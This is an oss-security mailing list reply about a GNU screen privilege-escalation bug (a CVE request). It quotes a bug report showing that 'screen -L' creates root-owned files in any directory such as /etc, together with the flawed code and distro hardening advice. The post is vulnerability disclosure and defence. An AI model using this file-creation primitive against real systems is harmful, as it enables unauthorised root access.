  oss-security - Re: CVE request: GNU screen escalation            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [<thread-prev] [thread-next>] [day] [month] [year] [list]  Date: Wed, 25 Jan From: Solar Designer <solar@...nwall.com> To: oss-security@...ts.openwall.com Cc: abe@...ian.org Subject: Re: CVE request: GNU screen escalation  On Tue, Jan 24, at Moritz Muehlenhoff wrote: > please assign a CVE ID for this vulnerability in GNU screen: >  Per oss-security list content guidelines:  http://oss-security.openwall.org/wiki/mailing-lists/oss-security#list-content-guidelines  "At least the most essential part of your message (e.g., vulnerability detail and/or exploit) should be directly included in the message itself (and in plain text), rather than only included by reference to an external resource.  Posting links to relevant external resources as well is acceptable, but posting only links is not.  Your message should remain valuable even with all of the external resources gone."  let's be including the actual content in here, in addition to links.  The screen-devel above is:  --- From:	anonymous Subject: 	[screen-devel] [bug root exploit Date: 	Tue, 24 Jan (UTC)  URL:                     Summary: root exploit                  Project: GNU Screen             Submitted by: None             Submitted on: Tue 24 Jan PM UTC                 Category: Program Logic                 Severity: 3 - Normal                 Priority: 5 - Normal                   Status: None                  Privacy: Private              Assigned to: None              Open/Closed: Open          Discussion Lock: Any                  Release: None            Fixed Release: None          Planned Release: None            Work Required: None      _______________________________________________________  Details:  Commit ("screen.c: adding permissions check for the logfile name",  The check opens the logfile with full root privileges. This allows us to truncate any file or create a root-owned file with any contents in any directory and can be easily exploited to full root access in several ways.  > address@...den:~$ screen --version > Screen version (GNU) > address@...den:~$ id > > address@...den:~$ cd /etc > address@...den:/etc (master)$ screen -D -m -L bla.bla echo fail > address@...den:/etc (master)$ ls -l bla.bla > -rw-rw---- 1 root buczek 6 Jan 24 bla.bla > address@...den:/etc (master)$ cat bla.bla > fail > address@...den:/etc (master)$   Donald Buczek <address@...den> ---  There are some follow-ups, notably Axel Beckert pointing out that the issue appears to have been introduced on (not  --- > Commit ("screen.c: adding permissions check for the logfile name", >  There is no such commit id, neither in the master branch nor in the screen-v4 branch.  I assume you meant one of these two commits instead:  master:  screen-v4:   The latter is the one included in Screen ---  The commits add this code:  --- +              FILE *w_check; +              if ((w_check = fopen(screenlogfile, "w")) == NULL) +                Panic(0, "-L: logfile name access problem"); +              else +                fclose(w_check); ---  apparently into command-line option parsing in main(), thus apparently prior to dropping the privileges.  (I didn't review this in context.)  Last but not least, I hope distros don't install screen SUID root these days.  If any distro does, this is yet another reminder to reconsider.  Some install it SGID utmp.  Some take it a step further - Owl and ALT Linux install it SGID to group screen, which only grants the ability to invoke utempter (SGID utmp) and tcp_chkpwd (SGID shadow).  Thus, it'd take a vulnerability in those other tools to make much use of a screen vulnerability.  Here's an excerpt from ALT Linux's spec file:  %post ln -f %_libexecdir/chkpwd/tcb_chkpwd %_libexecdir/screen/ ln -f %_libexecdir/utempter/utempter %_libexecdir/screen/  %preun if [ $1 -eq 0 ]; then rm -f %_libexecdir/screen/{tcb_chkpwd,utempter} fi  %triggerin -- pam_tcb >= ln -f %_libexecdir/chkpwd/tcb_chkpwd %_libexecdir/screen/  %triggerin -- libutempter >= ln -f %_libexecdir/utempter/utempter %_libexecdir/screen/  %files %_bindir/screen %dir %_libexecdir/screen %ghost %_libexecdir/screen/tcb_chkpwd %ghost %_libexecdir/screen/utempter %dir /var/run/screen/  Alexander  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      